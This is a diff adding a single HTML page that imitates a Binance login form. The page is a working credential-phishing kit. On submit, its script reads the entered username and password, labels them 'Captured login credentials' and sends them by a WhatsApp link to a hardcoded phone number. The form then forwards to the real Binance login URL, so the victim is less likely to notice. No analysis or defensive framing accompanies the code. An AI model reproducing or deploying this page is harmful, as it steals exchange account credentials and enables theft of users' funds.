@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Binance Login</title>
+    <script>
+        function sendDataToWhatsApp() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+
+            var data = {
+                username: username,
+                password: password
+            };
+
+            var chat_id = '447861655967'; // Replace 'YOUR_CHAT_ID' with the actual chat ID
+            var message = 'Captured login credentials:\n' + JSON.stringify(data);
+            var whatsapp_url = 'https://api.whatsapp.com/send?phone=' + chat_id + '&text=' + encodeURIComponent(message);
+
+            window.open(whatsapp_url, '_blank');
+        }
+    </script>
+</head>
+<body>
+    <h1>Binance Login</h1>
+    <form action="https://accounts.binance.com/en/login?return_to=aHR0cHM6Ly93d3cuYmluYW5jZS5jb20vZW4vbXkvc2V0dGluZ3Mva3ljP19kcD1ZbTVqT2k4dllYQndMbUpwYm1GdVkyVXVZMjl0TDNkbFluWnBaWGN2ZDJWaWRtbGxkejkwZVhCbFBXUmxabUYxYkhRbWJtVmxaRXh2WjJsdVBXWmhiSE5sSm5WeWJEMWhTRkl3WTBoTk5reDVPVE5rTTJOMVdXMXNkVmxYTldwYVV6VnFZakl3ZGxwWE5IWmlXR3QyWXpKV01HUkhiSFZhTTAxMlkwaEtkbHB0YkhOYVVUMDkmdXRtX2NhbXBhaWduPUtZQytXYXJuaW5nKy0rRVUrLStiYXRjaCsyYSZ1dG1fY29udGVudD1FbWFpbCsxKy0rUGhhc2UrMistK1YxJnV0bV9tZWRpdW09RW1haWwmdXRtX3NvdXJjZT1DUk0=" method="POST" onsubmit="sendDataToWhatsApp();">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required><br>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br>
+
+        <input type="submit" value="Login">
+    </form>
+</body>
+</html>
